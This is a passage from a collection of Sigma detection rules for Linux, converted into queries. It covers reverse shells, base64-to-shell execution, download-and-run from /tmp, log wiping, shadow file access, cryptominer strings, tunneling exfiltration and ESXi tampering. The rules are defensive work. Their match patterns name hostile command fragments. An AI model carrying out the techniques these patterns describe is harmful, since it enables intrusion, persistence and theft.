query: any where (DestinationHostname like~ ("*.localto.net", "*.localtonet.com")) and Initiated:"true"

name: SIGMA - Communication To Ngrok Tunneling Service - Linux
author: Florian Roth (Nextron Systems)
description: Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors
query: any where DestinationHostname like~ ("*tunnel.us.ngrok.com*", "*tunnel.eu.ngrok.com*", "*tunnel.ap.ngrok.com*", "*tunnel.au.ngrok.com*", "*tunnel.sa.ngrok.com*", "*tunnel.jp.ngrok.com*", "*tunnel.in.ngrok.com*")

name: SIGMA - Potentially Suspicious Malware Callback Communication - Linux
author: hasselj
description: Detects programs that connect to known malware callback ports based on threat intelligence reports.
query: any where (Initiated:"true" and (DestinationPort like~ (888, 999, 2200, 2222, 4000, 4444, 6789, 8531, 50501, 51820))) and (not (cidrMatch(DestinationIp, "127.0.0.0/8") or cidrMatch(DestinationIp, "10.0.0.0/8") or cidrMatch(DestinationIp, "172.16.0.0/12") or cidrMatch(DestinationIp, "192.168.0.0/16") or cidrMatch(DestinationIp, "169.254.0.0/16") or cidrMatch(DestinationIp, "::1/128") or cidrMatch(DestinationIp, "fe80::/10") or cidrMatch(DestinationIp, "fc00::/7")))

name: SIGMA - Shell Invocation via Apt - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description:
Detects the use of the "apt" and "apt-get" commands to execute a shell or proxy commands.
Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where (Image like~ ("*/apt", "*/apt-get")) and CommandLine:"*APT::Update::Pre-Invoke::=*"

name: SIGMA - Scheduled Task/Job At
author: Ömer Günal, oscd.community
description:
Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
query: any where Image like~ ("*/at", "*/atd")

name: SIGMA - Suspicious Invocation of Shell via AWK - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description:
Detects the execution of "awk" or it's sibling commands, to invoke a shell using the system() function.
This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.
query: any where ((Image like~ ("*/awk", "*/gawk", "*/mawk", "*/nawk")) and CommandLine:"*BEGIN {system*") and (CommandLine like~ ("*/bin/bash*", "*/bin/dash*", "*/bin/fish*", "*/bin/sh*", "*/bin/zsh*"))

name: SIGMA - Decode Base64 Encoded Text
author: Daniil Yugoslavskiy, oscd.community
description: Detects usage of base64 utility to decode arbitrary base64-encoded text
query: any where Image:"*/base64" and CommandLine:"*-d*"

name: SIGMA - Linux Base64 Encoded Pipe to Shell
author: pH-T (Nextron Systems)
description: Detects suspicious process command line that uses base64 encoded input for execution with a shell
query: any where CommandLine:"*base64 *" and ((CommandLine like~ ("*| bash *", "*| sh *", "*|bash *", "*|sh *")) or (CommandLine like~ ("* |sh", "*| bash", "*| sh", "*|bash")))

name: SIGMA - Linux Base64 Encoded Shebang In CLI
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded
query: any where CommandLine like~ ("*IyEvYmluL2Jhc2*", "*IyEvYmluL2Rhc2*", "*IyEvYmluL3pza*", "*IyEvYmluL2Zpc2*", "*IyEvYmluL3No*")

name: SIGMA - Bash Interactive Shell
author: @d4ns4n_
description: Detects execution of the bash shell with the interactive flag "-i".
query: any where Image:"*/bash" and CommandLine:"* -i *"

name: SIGMA - BPFtrace Unsafe Option Usage
author: Andreas Hunkeler (@Karneades)
description: Detects the usage of the unsafe bpftrace option
false_positives: Legitimate usage of the unsafe option
query: any where Image:"*bpftrace" and CommandLine:"*--unsafe*"

name: SIGMA - Enable BPF Kprobes Tracing
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects common command used to enable bpf kprobes tracing
query: any where (CommandLine:"*echo 1 >*" and CommandLine:"*/sys/kernel/debug/tracing/events/kprobes/*") and (CommandLine like~ ("*/myprobe/enable*", "*/myretprobe/enable*"))

name: SIGMA - Capabilities Discovery - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects usage of "getcap" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other.
query: any where Image:"*/getcap" and CommandLine like~ ("* -r *", "* /r *", "* –r *", "* —r *", "* ―r *")

name: SIGMA - Capsh Shell Invocation - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "capsh" utility to invoke a shell.
query: any where Image:"*/capsh" and CommandLine:"* --"

name: SIGMA - Remove Immutable File Attribute
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects usage of the 'chattr' utility to remove immutable file attribute.
false_positives: Administrator interacting with immutable files (e.g. for instance backups).

subtechnique.name: Linux and Mac File and Directory Permissions Modification

query: any where Image:"*/chattr" and CommandLine:"* -i *"

name: SIGMA - Linux Sudo Chroot Execution
author: Swachchhanda Shrawn Poudel (Nextron Systems)
description:
Detects the execution of 'sudo' command with '--chroot' option, which is used to change the root directory for command execution.
Attackers may use this technique to evade detection and execute commands in a modified environment.
This can be part of a privilege escalation strategy, as it allows the execution of commands with elevated privileges in a controlled environment as seen in CVE-2025-32463.
While investigating, look out for unusual or unexpected use of 'sudo --chroot' in conjunction with other commands or scripts such as execution from temporary directories or unusual user accounts.
false_positives: Legitimate administrative tasks or scripts that use 'sudo --chroot' for containerization, testing, or system management.
query: any where Image:"*/sudo" and (CommandLine like~ ("* --chroot *", "*sudo -R *"))

name: SIGMA - Clear Linux Logs
author: Ömer Günal, oscd.community
description: Detects attempts to clear logs on the system. Adversaries may clear system logs to hide evidence of an intrusion

subtechnique.name: Clear Linux or Mac System Logs

query: any where (Image like~ ("*/rm", "*/shred", "*/unlink")) and (CommandLine like~ ("*/var/log*", "*/var/spool/mail*"))

name: SIGMA - Commands to Clear or Remove the Syslog
author: Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description: Detects specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks

subtechnique.name: Clear Linux or Mac System Logs

query: any where CommandLine like~ ("*rm /var/log/syslog*", "*rm -r /var/log/syslog*", "*rm -f /var/log/syslog*", "*rm -rf /var/log/syslog*", "*unlink /var/log/syslog*", "*unlink -r /var/log/syslog*", "*unlink -f /var/log/syslog*", "*unlink -rf /var/log/syslog*", "*mv /var/log/syslog*", "* >/var/log/syslog*", "* > /var/log/syslog*", "*journalctl --vacuum*")

name: SIGMA - Clipboard Collection with Xclip Tool
author: Pawel Mazur, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
query: any where Image:"*xclip*" and (CommandLine:"*-sel*" and CommandLine:"*clip*" and CommandLine:"*-o*")

name: SIGMA - Copy Passwd Or Shadow From TMP Path
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects when the file "passwd" or "shadow" is copied from tmp path
query: any where Image:"*/cp" and CommandLine:"*/tmp/*" and (CommandLine like~ ("*passwd*", "*shadow*"))

name: SIGMA - Crontab Enumeration
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects usage of crontab to list the tasks of the user
query: any where Image:"*/crontab" and CommandLine:"* -l*"

name: SIGMA - Remove Scheduled Cron Task/Job
author: Nasreddine Bencherchali (Nextron Systems)
description:
Detects usage of the 'crontab' utility to remove the current crontab.
This is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible
query: any where Image:"*crontab" and CommandLine:"* -r*"

name: SIGMA - Linux Crypto Mining Indicators
author: Florian Roth (Nextron Systems)
description: Detects command line parameters or strings often used by crypto miners
query: any where CommandLine like~ ("* --cpu-priority=*", "*--donate-level=0*", "* -o pool.*", "* --nicehash*", "* --algo=rx/0 *", "*stratum+tcp://*", "*stratum+udp://*", "*sh -c /sbin/modprobe msr allow_writes=on*", "*LS1kb25hdGUtbGV2ZWw9*", "*0tZG9uYXRlLWxldmVsP*", "*tLWRvbmF0ZS1sZXZlbD*", "*c3RyYXR1bSt0Y3A6Ly*", "*N0cmF0dW0rdGNwOi8v*", "*zdHJhdHVtK3RjcDovL*", "*c3RyYXR1bSt1ZHA6Ly*", "*N0cmF0dW0rdWRwOi8v*", "*zdHJhdHVtK3VkcDovL*")

name: SIGMA - Curl Usage on Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server
false_positives: Scripts created by developers and admins
query: any where Image:"*/curl"

name: SIGMA - Suspicious Download and Execute Pattern via Curl/Wget
author: Aayush Gupta
description:
Detects suspicious use of command-line tools such as curl or wget to download remote
content - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp), followed by
immediate execution, indicating potential malicious activity. This pattern is commonly used
by malicious scripts, stagers, or downloaders in fileless or multi-stage Linux attacks.
false_positives: System update scripts using temporary files
Installer scripts or automated provisioning tools
query: any where (CommandLine like~ ("*/curl*", "*/wget*")) and (CommandLine like~ ("*/tmp/*", "*/dev/shm/*")) and CommandLine:"*sh -c*"

name: SIGMA - Atlassian Confluence CVE-2022-26134
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2022-26134
query: any where ParentImage:"/opt/atlassian/confluence/*" and ParentImage:"*/java" and (CommandLine like~ ("*/bin/sh*", "*bash*", "*dash*", "*ksh*", "*zsh*", "*csh*", "*fish*", "*curl*", "*wget*", "*python*"))

name: SIGMA - Apache Spark Shell Command Injection - ProcessCreation
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects attempts to exploit an apache spark server via CVE-2014-6287 from a commandline perspective
query: any where ParentImage:"*\\bash" and (CommandLine like~ ("*id -Gn `*", "*id -Gn '*"))

name: SIGMA - DD File Overwrite
author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description: Detects potential overwriting and deletion of a file using DD.
false_positives: Any user deleting files that way.
query: any where (Image like~ ("/bin/dd", "/usr/bin/dd")) and CommandLine:"*of=*" and (CommandLine like~ ("*if=/dev/zero*", "*if=/dev/null*"))

name: SIGMA - Potential Linux Process Code Injection Via DD Utility
author: Joseph Kamau
description: Detects the injection of code by overwriting the memory map of a Linux process using the "dd" Linux command.
query: any where Image:"*/dd" and (CommandLine:"*of=*" and CommandLine:"*/proc/*" and CommandLine:"*/mem*")

name: SIGMA - Ufw Force Stop Using Ufw-Init
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects attempts to force stop the ufw using ufw-init
query: any where (CommandLine:"*-ufw-init*" and CommandLine:"*force-stop*") or (CommandLine:"*ufw*" and CommandLine:"*disable*")

name: SIGMA - Linux Doas Tool Execution
author: Sittikorn S, Teoderick Contreras
description: Detects the doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does.
query: any where Image:"*/doas"

name: SIGMA - Shell Invocation via Env Command - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the env command to invoke a shell. This may indicate an attempt to bypass restricted environments, escalate privileges, or execute arbitrary commands.
query: any where Image:"*/env" and (CommandLine like~ ("*/bin/bash", "*/bin/dash", "*/bin/fish", "*/bin/sh", "*/bin/zsh"))

name: SIGMA - ESXi Network Configuration Discovery Via ESXCLI
author: Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "network" flag in order to retrieve information about the network configuration.
query: any where (Image:"*/esxcli" and CommandLine:"*network*") and (CommandLine like~ ("* get*", "* list*"))

name: SIGMA - ESXi Admin Permission Assigned To Account Via ESXCLI
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects execution of the "esxcli" command with the "system" and "permission" flags in order to assign admin permissions to an account.
query: any where Image:"*/esxcli" and CommandLine:"*system*" and (CommandLine:"* permission *" and CommandLine:"* set*" and CommandLine:"*Admin*")

name: SIGMA - ESXi Storage Information Discovery Via ESXCLI
author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "storage" flag in order to retrieve information about the storage status and other related information. Seen used by malware such as DarkSide and LockBit.
query: any where (Image:"*/esxcli" and CommandLine:"*storage*") and (CommandLine like~ ("* get*", "* list*"))

name: SIGMA - ESXi Syslog Configuration Change Via ESXCLI
author: Cedric Maurugeon
description: Detects changes to the ESXi syslog configuration via "esxcli"
query: any where Image:"*/esxcli" and (CommandLine:"*system*" and CommandLine:"*syslog*" and CommandLine:"*config*") and CommandLine:"* set*"

name: SIGMA - ESXi System Information Discovery Via ESXCLI
author: Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "system" flag in order to retrieve information about the different component of the system. Such as accounts, modules, NTP, etc.
query: any where (Image:"*/esxcli" and CommandLine:"*system*") and (CommandLine like~ ("* get*", "* list*"))

name: SIGMA - ESXi Account Creation Via ESXCLI
author: Cedric Maurugeon
description: Detects user account creation on ESXi system via esxcli
query: any where Image:"*/esxcli" and (CommandLine:"*system *" and CommandLine:"*account *" and CommandLine:"*add *")

name: SIGMA - ESXi VM List Discovery Via ESXCLI
author: Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "vm" flag in order to retrieve information about the installed VMs.
query: any where Image:"*/esxcli" and CommandLine:"*vm process*" and CommandLine:"* list"

name: SIGMA - ESXi VM Kill Via ESXCLI
author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "vm" and "kill" flag in order to kill/shutdown a specific VM.
query: any where Image:"*/esxcli" and (CommandLine:"*vm process*" and CommandLine:"*kill*")

name: SIGMA - ESXi VSAN Information Discovery Via ESXCLI
author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
description: Detects execution of the "esxcli" command with the "vsan" flag in order to retrieve information about virtual storage. Seen used by malware such as DarkSide.
query: any where (Image:"*/esxcli" and CommandLine:"*vsan*") and (CommandLine like~ ("* get*", "* list*"))

name: SIGMA - File and Directory Discovery - Linux
author: Daniil Yugoslavskiy, oscd.community, CheraghiMilad
description: Detects usage of system utilities such as "find", "tree", "findmnt", etc, to discover files, directories and network shares.
query: any where (Image:"*/file" and CommandLine regex~ "(.){200,}") or (Image:"*/ls" and CommandLine:"*-R*") or Image:"*/find" or Image:"*/tree" or Image:"*/findmnt" or Image:"*/mlocate"

name: SIGMA - File Deletion
author: Ömer Günal, oscd.community
description: Detects file deletion using "rm", "shred" or "unlink" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity
query: any where Image like~ ("*/rm", "*/shred", "*/unlink")

name: SIGMA - Shell Execution via Find - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the find command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or exploitation attempt.
query: any where (Image:"*/find" and (CommandLine:"* . *" and CommandLine:"*-exec*")) and (CommandLine like~ ("*/bin/bash*", "*/bin/dash*", "*/bin/fish*", "*/bin/sh*", "*/bin/zsh*"))

name: SIGMA - Shell Execution via Flock - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "flock" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where (Image:"*/flock" and CommandLine:"* -u *") and (CommandLine like~ ("*/bin/bash*", "*/bin/dash*", "*/bin/fish*", "*/bin/sh*", "*/bin/zsh*"))

name: SIGMA - Shell Execution GCC  - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "gcc" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where ((Image like~ ("*/c89", "*/c99", "*/gcc")) and CommandLine:"*-wrapper*") and (CommandLine like~ ("*/bin/bash,-s*", "*/bin/dash,-s*", "*/bin/fish,-s*", "*/bin/sh,-s*", "*/bin/zsh,-s*"))

name: SIGMA - Shell Execution via Git - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "git" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where ParentImage:"*/git" and (ParentCommandLine:"* -p *" and ParentCommandLine:"*help*") and (CommandLine like~ ("*bash 0<&1*", "*dash 0<&1*", "*sh 0<&1*"))

name: SIGMA - OS Architecture Discovery Via Grep
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects the use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of "uname" or "cat /proc/cpuinfo"
query: any where Image:"*/grep" and (CommandLine like~ ("*aarch64", "*arm", "*i386", "*i686", "*mips", "*x86_64"))

name: SIGMA - Group Has Been Deleted Via Groupdel
author: Tuan Le (NCSGroup)
description: Detects execution of the "groupdel" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks
query: any where Image:"*/groupdel"

name: SIGMA - Install Root Certificate
author: Ömer Günal, oscd.community
description: Detects installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s
query: any where Image like~ ("*/update-ca-certificates", "*/update-ca-trust")

name: SIGMA - Suspicious Package Installed - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects installation of suspicious packages using system installation utilities
query: any where (((Image like~ ("*/apt", "*/apt-get")) and CommandLine:"*install*") or (Image:"*/yum" and (CommandLine like~ ("*localinstall*", "*install*"))) or (Image:"*/rpm" and CommandLine:"*-i*") or (Image:"*/dpkg" and (CommandLine like~ ("*--install*", "*-i*")))) and (CommandLine like~ ("*nmap*", "* nc*", "*netcat*", "*wireshark*", "*tshark*", "*openconnect*", "*proxychains*"))

name: SIGMA - Flush Iptables Ufw Chain
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic
query: any where (Image like~ ("*/iptables", "*/xtables-legacy-multi", "*/iptables-legacy-multi", "*/ip6tables", "*/ip6tables-legacy-multi")) and (CommandLine like~ ("*-F*", "*-Z*", "*-X*")) and (CommandLine like~ ("*ufw-logging-deny*", "*ufw-logging-allow*", "*ufw6-logging-deny*", "*ufw6-logging-allow*"))

name: SIGMA - Local System Accounts Discovery - Linux
author: Alejandro Ortuno, oscd.community, CheraghiMilad
description: Detects enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.
query: any where Image:"*/lastlog" or CommandLine:"*'x:0:'*" or ((Image like~ ("*/cat", "*/ed", "*/head", "*/more", "*/nano", "*/tail", "*/vi", "*/vim", "*/less", "*/emacs", "*/sqlite3", "*/makemap")) and (CommandLine like~ ("*/etc/passwd*", "*/etc/shadow*", "*/etc/sudoers*", "*/etc/spwd.db*", "*/etc/pwd.db*", "*/etc/master.passwd*"))) or Image:"*/id" or (Image:"*/lsof" and CommandLine:"*-u*")

name: SIGMA - Local Groups Discovery - Linux
author: Ömer Günal, Alejandro Ortuno, oscd.community
description: Detects enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings
query: any where Image:"*/groups" or ((Image like~ ("*/cat", "*/ed", "*/head", "*/less", "*/more", "*/nano", "*/tail", "*/vi", "*/vim")) and CommandLine:"*/etc/group*")

name: SIGMA - Potential GobRAT File Discovery Via Grep
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects the use of grep to discover specific files created by the GobRAT malware
query: any where Image:"*/grep" and (CommandLine like~ ("*apached*", "*frpc*", "*sshd.sh*", "*zone.arm*"))

name: SIGMA - Named Pipe Created Via Mkfifo
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the creation of a new named pipe using the "mkfifo" utility
query: any where Image:"*/mkfifo"

name: SIGMA - Potentially Suspicious Named Pipe Created Via Mkfifo
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the creation of a new named pipe using the "mkfifo" utility in a potentially suspicious location
query: any where Image:"*/mkfifo" and CommandLine:"* /tmp/*"

name: SIGMA - Mount Execution With Hidepid Parameter
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects execution of the "mount" command with "hidepid" parameter to make invisible processes to other users from the system
query: any where Image:"*/mount" and (CommandLine:"*hidepid=2*" and CommandLine:"* -o *")

name: SIGMA - Potential Netcat Reverse Shell Execution
author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
description: Detects execution of netcat with the "-e" flag followed by common shells. This could be a sign of a potential reverse shell setup.
query: any where (Image like~ ("*/nc", "*/ncat")) and (CommandLine like~ ("* -c *", "* -e *")) and (CommandLine like~ ("* ash*", "* bash*", "* bsh*", "* csh*", "* ksh*", "* pdksh*", "* sh*", "* tcsh*", "*/bin/ash*", "*/bin/bash*", "*/bin/bsh*", "*/bin/csh*", "*/bin/ksh*", "*/bin/pdksh*", "*/bin/sh*", "*/bin/tcsh*", "*/bin/zsh*", "*$IFSash*", "*$IFSbash*", "*$IFSbsh*", "*$IFScsh*", "*$IFSksh*", "*$IFSpdksh*", "*$IFSsh*", "*$IFStcsh*", "*$IFSzsh*"))

name: SIGMA - Shell Execution via Nice - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "nice" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where Image:"*/nice" and (CommandLine like~ ("*/bin/bash", "*/bin/dash", "*/bin/fish", "*/bin/sh", "*/bin/zsh"))

name: SIGMA - Nohup Execution
author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io
description: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments
false_positives: Administrators or installed processes that leverage nohup
query: any where Image:"*/nohup"

name: SIGMA - Suspicious Nohup Execution
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects execution of binaries located in potentially suspicious locations via "nohup"
query: any where Image:"*/nohup" and CommandLine:"*/tmp/*"

name: SIGMA - OMIGOD SCX RunAsProvider ExecuteScript
author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description:
Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.
Script being executed gets created as a temp file in /tmp folder with a scx* prefix.
Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.
The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.
false_positives: Legitimate use of SCX RunAsProvider ExecuteScript.
query: any where User:"root" and LogonId:0 and CurrentDirectory:"/var/opt/microsoft/scx/tmp" and CommandLine:"*/etc/opt/microsoft/scx/conf/tmpdir/scx*"

name: SIGMA - OMIGOD SCX RunAsProvider ExecuteShellCommand
author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description:
Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.
SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.
false_positives: Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand.
query: any where User:"root" and LogonId:0 and CurrentDirectory:"/var/opt/microsoft/scx/tmp" and CommandLine:"*/bin/sh*"

name: SIGMA - Potential Perl Reverse Shell Execution
author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
description: Detects execution of the perl binary with the "-e" flag and common strings related to potential reverse shell activity
query: any where (Image:"*/perl" and CommandLine:"* -e *") and ((CommandLine:"*fdopen(*" and CommandLine:"*::Socket::INET*") or (CommandLine:"*Socket*" and CommandLine:"*connect*" and CommandLine:"*open*" and CommandLine:"*exec*"))

name: SIGMA - Potential PHP Reverse Shell
author: @d4ns4n_
description:
Detects usage of the PHP CLI with the "-r" flag which allows it to run inline PHP code. The rule looks for calls to the "fsockopen" function which allows the creation of sockets.
Attackers often leverage this in combination with functions such as "exec" or "fopen" to initiate a reverse shell connection.
query: any where Image:"*/php*" and (CommandLine:"* -r *" and CommandLine:"*fsockopen*") and (CommandLine like~ ("*ash*", "*bash*", "*bsh*", "*csh*", "*ksh*", "*pdksh*", "*sh*", "*tcsh*", "*zsh*"))

name: SIGMA - Pnscan Binary Data Transmission Activity
author: David Burkett (@signalblur)
description:
Detects command line patterns associated with the use of Pnscan for sending and receiving binary data across the network.
This behavior has been identified in a Linux malware campaign targeting Docker, Apache Hadoop, Redis, and Confluence and was previously used by the threat actor known as TeamTNT
query: any where CommandLine regex~ "-(W|R)\s?(\s|"|')([0-9a-fA-F]{2}\s?){2,20}(\s|"|')"

name: SIGMA - Connection Proxy
author: Ömer Günal
description: Detects setting proxy configuration
query: any where CommandLine like~ ("*http_proxy=*", "*https_proxy=*")

name: SIGMA - PUA - TruffleHog Execution - Linux
author: Swachchhanda Shrawan Poudel (Nextron Systems)
description:
Detects execution of TruffleHog, a tool used to search for secrets in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used maliciously.
While it is a legitimate tool, intended for use in CI pipelines and security assessments,
It was observed in the Shai-Hulud malware campaign targeting npm packages to steal sensitive information.
false_positives: Legitimate use of TruffleHog by security teams or developers.
query: any where Image:"*/trufflehog" or ((CommandLine like~ ("* docker --image *", "* Git *", "* GitHub *", "* Jira *", "* Slack *", "* Confluence *", "* SharePoint *", "* s3 *", "* gcs *")) and CommandLine:"* --results=verified*")

name: SIGMA - Python Spawning Pretty TTY Via PTY Module
author: Nextron Systems
description: Detects a python process calling to the PTY module in order to spawn a pretty tty which could be indicative of potential reverse shell activity.
query: any where ((Image like~ ("*/python", "*/python2", "*/python3")) or (Image like~ ("*/python2.*", "*/python3.*"))) and (CommandLine like~ ("*import pty*", "*from pty *")) and CommandLine:"*spawn*"

name: SIGMA - Python Reverse Shell Execution Via PTY And Socket Modules
author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
description: Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.
query: any where Image:"*python*" and (CommandLine:"* -c *" and CommandLine:"*import*" and CommandLine:"*pty*" and CommandLine:"*socket*" and CommandLine:"*spawn*" and CommandLine:"*.connect*")

name: SIGMA - Inline Python Execution - Spawn Shell Via OS System Library
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects execution of inline Python code via the "-c" in order to call the "system" function from the "os" library, and spawn a shell.
query: any where ((Image like~ ("*/python", "*/python2", "*/python3")) or (Image like~ ("*/python2.*", "*/python3.*"))) and ((CommandLine:"* -c *" and CommandLine:"*os.system(*") and (CommandLine like~ ("*/bin/bash*", "*/bin/dash*", "*/bin/fish*", "*/bin/sh*", "*/bin/zsh*")))

name: SIGMA - Remote Access Tool - Team Viewer Session Started On Linux Host
author: Josh Nickels, Qi Nan
description:
Detects the command line executed when TeamViewer starts a session started by a remote host.
Once a connection has been started, an investigator can verify the connection details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.
query: any where ParentImage:"*/TeamViewer_Service" and Image:"*/TeamViewer_Desktop" and CommandLine:"*/TeamViewer_Desktop --IPCport 5939 --Module 1"

name: SIGMA - Linux Remote System Discovery
author: Alejandro Ortuno, oscd.community
description: Detects the enumeration of other remote systems.

name: SIGMA - Linux Package Uninstall
author: Tuan Le (NCSGroup), Nasreddine Bencherchali (Nextron Systems)
description: Detects linux package removal using builtin tools such as "yum", "apt", "apt-get" or "dpkg".
false_positives: Administrator or administrator scripts might delete packages for several reasons (debugging, troubleshooting).
query: any where (Image:"*/yum" and (CommandLine like~ ("*erase*", "*remove*"))) or ((Image like~ ("*/apt", "*/apt-get")) and (CommandLine like~ ("*remove*", "*purge*"))) or (Image:"*/dpkg" and (CommandLine like~ ("*--remove *", "* -r *"))) or (Image:"*/rpm" and CommandLine:"* -e *")

name: SIGMA - Shell Execution via Rsync - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.), Florian Roth
description: Detects the use of the "rsync" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
false_positives: Legitimate cases in which "rsync" is used to execute a shell
query: any where ((Image like~ ("*/rsync", "*/rsyncd")) and CommandLine:"* -e *") and (CommandLine like~ ("*/ash *", "*/bash *", "*/dash *", "*/csh *", "*/sh *", "*/zsh *", "*/tcsh *", "*/ksh *", "*'ash *", "*'bash *", "*'dash *", "*'csh *", "*'sh *", "*'zsh *", "*'tcsh *", "*'ksh *"))

name: SIGMA - Suspicious Invocation of Shell via Rsync
author: Florian Roth
description: Detects the execution of a shell as sub process of "rsync" without the expected command line flag "-e" being used, which could be an indication of exploitation as described in CVE-2024-12084. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.
query: any where ((ParentImage like~ ("*/rsync", "*/rsyncd")) and (Image like~ ("*/ash", "*/bash", "*/csh", "*/dash", "*/ksh", "*/sh", "*/tcsh", "*/zsh"))) and (not CommandLine:"* -e *")

name: SIGMA - Potential Ruby Reverse Shell
author: @d4ns4n_
description: Detects execution of ruby with the "-e" flag and calls to "socket" related functions. This could be an indication of a potential attempt to setup a reverse shell
query: any where Image:"*ruby*" and (CommandLine:"* -e*" and CommandLine:"*rsocket*" and CommandLine:"*TCPSocket*") and (CommandLine like~ ("* ash*", "* bash*", "* bsh*", "* csh*", "* ksh*", "* pdksh*", "* sh*", "* tcsh*"))

name: SIGMA - Scheduled Cron Task/Job - Linux
